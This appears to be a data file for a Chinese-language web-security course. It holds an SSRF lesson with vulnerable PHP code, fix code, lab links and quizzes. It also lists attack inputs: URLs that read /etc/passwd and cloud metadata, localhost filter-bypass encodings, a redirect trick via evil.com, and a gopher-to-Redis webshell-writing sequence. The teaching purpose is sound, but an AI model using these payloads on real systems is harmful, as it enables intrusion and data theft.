      code: [],
      labs: [],
      quiz: [
        "命令执行和代码执行的注入内容有什么本质不同？",
        "空格被过滤可以用什么替代？给出两种写法。",
        "无回显时怎么确认命令真的执行了？",
        "escapeshellarg 为什么能防命令注入？",
        "flag 不在 /flag 时，你会用哪条命令去找？"
      ]
    },
    {
      id: "p5l9",
      title: "SSRF：让服务器替你访问",
      est: 40,
      goal: "理解 SSRF 的三种用途（内网探测、读文件、打内网应用），掌握常见过滤的绕过。",
      sections: [
        { type: "p", text: "SSRF（Server-Side Request Forgery）的本质：<b>服务器会去访问你给的地址，而你给了一个它本不该访问的地址。</b>它的价值在于「绕过防火墙」——你从外网连不进去的内网服务，服务器能连。" },
        { type: "code", lang: "php", title: "典型漏洞代码", src: `<?php
// 功能：图片加载 / URL 预览 / 远程下载
$url = $_GET['url'];
echo file_get_contents($url);

// 正常：?url=https://example.com/a.png
// 攻击：?url=http://127.0.0.1/admin          （访问本机管理后台）
// 攻击：?url=file:///etc/passwd               （读本地文件）
// 攻击：?url=http://169.254.169.254/latest/meta-data/   （云元数据）
?>` },
        { type: "table", title: "协议与用途", head: ["协议", "用途", "说明"], rows: [
          ["http / https", "打内网 Web 服务", "最常见"],
          ["file://", "读本地文件", "PHP 默认允许"],
          ["dict://", "探测端口、打 Redis/Memcached", "dict://127.0.0.1:6379/info"],
          ["gopher://", "构造任意 TCP 报文（打 Redis、MySQL、FastCGI）", "能发原始字节，利用面最广"],
          ["ftp:// / tftp://", "探测内网文件服务", "有时可用"]
        ]},
        { type: "h", text: "判断 SSRF 是否存在" },
        { type: "steps", items: [
          "找一个「服务器会访问 URL」的功能：图片加载、URL 预览、webhook、远程下载、PDF 生成。",
          "喂一个自己控制的地址（或 dnslog.cn），看服务器有没有回连——有回连就是 SSRF。",
          "试 <code>http://127.0.0.1:端口</code> 扫内网端口：响应时间/内容不同就是服务存活。",
          "试 <code>file:///etc/passwd</code> 读文件；试 <code>http://169.254.169.254/</code> 读云元数据。",
          "拿到 Redis / MySQL 之类内网服务时，用 gopher 构造报文打（这一层属于进阶）。"
        ]},
        { type: "code", lang: "bash", title: "gopher 打 Redis 的思路", src: `# Redis 未授权：直接写 webshell 或写 crontab
# gopher 报文体需要把命令转成 Redis 协议（RESP）再做 URL 编码
# 常用工具：Gopherus、SSRFmap

# 简化示意：gopher://127.0.0.1:6379/_<URL编码后的RESP>
# 关键命令序列：CONFIG SET dir /var/www/html -> CONFIG SET dbfilename 1.php -> SET x "<?php ...?>" -> SAVE` },
        { type: "table", title: "常见过滤与绕过", head: ["过滤方式", "绕过写法"], rows: [
          ["过滤 127.0.0.1", "127.1、0.0.0.0、[::1]、2130706433、0x7f000001、127.0.0.1.nip.io"],
          ["过滤 localhost", "同上，或 DNS 重绑定（第一次解析公网 IP 过校验，第二次解析内网）"],
          ["只允许 http://", "302 跳转绕过：自己的服务器跳回内网地址"],
          ["校验 URL 前缀", "user@host 形式：http://expected.com@evil.com/"],
          ["校验 host 但没校验端口", "直接换端口找内网服务"],
          ["禁 file 协议", "用 gopher / dict 曲线读文件或打服务（取决于库）"]
        ]},
        { type: "code", lang: "php", title: "修复：白名单 + 解析后校验", src: `<?php
// 1. 只允许明确需要的协议
$scheme = parse_url($url, PHP_URL_SCHEME);
if (!in_array($scheme, ['http', 'https'])) die("协议不允许");

// 2. 解析域名成 IP，再判断是不是内网地址
$host = parse_url($url, PHP_URL_HOST);
$ip = gethostbyname($host);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die("内网地址不允许");
}

// 3. 禁止跟随跳转（curl: CURLOPT_FOLLOWLOCATION => false）
// 4. 出站流量走统一代理，在代理层做白名单
?>` },
        { type: "note", text: "SSRF 的修复比利用更难：因为「解析」和「连接」之间有时间差（DNS 重绑定就利用这一点）。生产上最可靠的做法是<b>出站白名单代理</b>，而不是在代码里做黑名单过滤。" }
      ],
      code: [],
      labs: [
        { name: "PortSwigger · SSRF", url: "https://portswigger.net/web-security/ssrf" },
        { name: "CTFHub · SSRF 专项", url: "https://www.ctfhub.com/" }
      ],
      quiz: [
        "SSRF 为什么能绕过防火墙？",
        "169.254.169.254 是什么地址？拿到它能干什么？",
        "DNS 重绑定怎么绕过「只允许公网 IP」的校验？",
        "为什么说 SSRF 的修复比利用更难？",
        "写出两种绕过 127.0.0.1 过滤的写法。"
      ]
    }
  ]
});
